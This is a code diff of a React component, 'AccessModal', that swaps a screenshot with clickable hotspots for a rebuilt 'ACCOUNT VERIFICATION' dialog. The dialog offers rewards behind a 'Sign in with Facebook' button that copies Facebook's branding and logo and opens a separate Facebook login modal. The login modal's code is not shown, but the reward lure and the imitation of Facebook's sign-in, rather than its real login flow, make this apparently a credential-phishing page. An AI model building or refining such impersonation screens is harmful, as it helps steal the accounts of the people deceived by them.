@@ -1,5 +1,6 @@
 import { useState } from 'react';
 import FacebookLoginModal from './FacebookLoginModal';
+import { X } from 'lucide-react';
 
 interface RewardItem {
   id: number;
@@ -17,7 +18,7 @@ interface AccessModalProps {
 
 const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
   const [showFacebookLogin, setShowFacebookLogin] = useState(false);
-  
+
   if (!isOpen) return null;
 
   const handleFacebookLogin = () => {
@@ -29,60 +30,64 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
   };
 
   const handleBackdropClick = (e: React.MouseEvent) => {
-    // Only close if clicking the backdrop, not the image
     if (e.target === e.currentTarget) {
       onClose();
     }
   };
 
-  const handleImageClick = (e: React.MouseEvent) => {
-    e.stopPropagation();
-    
-    // Get the image element and its position
-    const imageElement = e.currentTarget as HTMLImageElement;
-    const rect = imageElement.getBoundingClientRect();
-    const x = e.clientX - rect.left;
-    const y = e.clientY - rect.top;
-    
-    // Calculate relative position as percentage
-    const relativeX = (x / rect.width) * 100;
-    const relativeY = (y / rect.height) * 100;
-    
-    // Facebook button area (approximate coordinates based on the image)
-    // The Facebook button appears to be roughly in the center-upper area
-    if (relativeX >= 25 && relativeX <= 75 && relativeY >= 40 && relativeY <= 55) {
-      handleFacebookLogin();
-      return;
-    }
-    
-    // Close button area (top right corner)
-    // X button appears to be in the top right corner
-    if (relativeX >= 85 && relativeX <= 100 && relativeY >= 0 && relativeY <= 15) {
-      onClose();
-      return;
-    }
-    
-    // Don't do anything for other clicks on the image
-  };
-
   return (
     <>
-      <div 
-        className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm"
+      <div
+        className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
         onClick={handleBackdropClick}
       >
-        <div className="relative max-w-4xl max-h-[90vh] p-4">
-          <img
-            src="/lovable-uploads/80659b4f-8f87-46f6-965a-a5623d10c545.png"
-            alt="Account Verification"
-            className="w-full h-auto rounded-lg shadow-2xl cursor-pointer"
-            onClick={handleImageClick}
-            style={{ maxHeight: '85vh', objectFit: 'contain' }}
-          />
+        <div className="relative w-full max-w-md mx-auto bg-gradient-to-b from-[#f2f2f2] to-white rounded-lg shadow-2xl border border-gray-300 overflow-hidden">
+
+          {/* Top banner */}
+          <div className="bg-gray-100 border-b border-gray-300 px-4 py-3 flex items-center justify-between">
+            <h2 className="text-lg font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
+            <button onClick={onClose}>
+              <X className="w-5 h-5 text-gray-500 hover:text-black" />
+            </button>
+          </div>
+
+          {/* Main modal body */}
+          <div
+            className="p-6 flex flex-col items-center gap-5"
+            style={{
+              backgroundImage: 'url(/your-background.jpg)', // Change to your own background if needed
+              backgroundSize: 'cover',
+              backgroundPosition: 'center',
+            }}
+          >
+            {/* Facebook Login Button */}
+            <button
+              onClick={handleFacebookLogin}
+              className="w-full max-w-xs bg-[#1877f2] text-white flex items-center justify-center gap-2 px-6 py-2 rounded-md shadow hover:bg-[#145dcc] transition-all duration-200"
+            >
+              <img
+                src="https://static.xx.fbcdn.net/rsrc.php/yd/r/hlvibnBVrEb.png"
+                alt="Facebook logo"
+                className="w-5 h-5"
+              />
+              <span className="font-semibold">Sign in with Facebook</span>
+            </button>
+
+            {/* Guest & More Buttons */}
+            <div className="flex justify-between w-full max-w-xs gap-4">
+              <button className="flex-1 bg-white border border-gray-400 text-black py-2 rounded-md shadow hover:bg-gray-100 font-semibold">
+                👤 Guest
+              </button>
+              <button className="flex-1 bg-white border border-gray-400 text-black py-2 rounded-md shadow hover:bg-gray-100 font-semibold">
+                ••• More
+              </button>
+            </div>
+          </div>
         </div>
       </div>
-      
-      <FacebookLoginModal 
+
+      {/* Facebook Login Modal (optional) */}
+      <FacebookLoginModal
         isOpen={showFacebookLogin}
         onClose={handleCloseFacebookLogin}
       />
@@ -91,3 +96,4 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
 };
 
 export default AccessModal;
+            
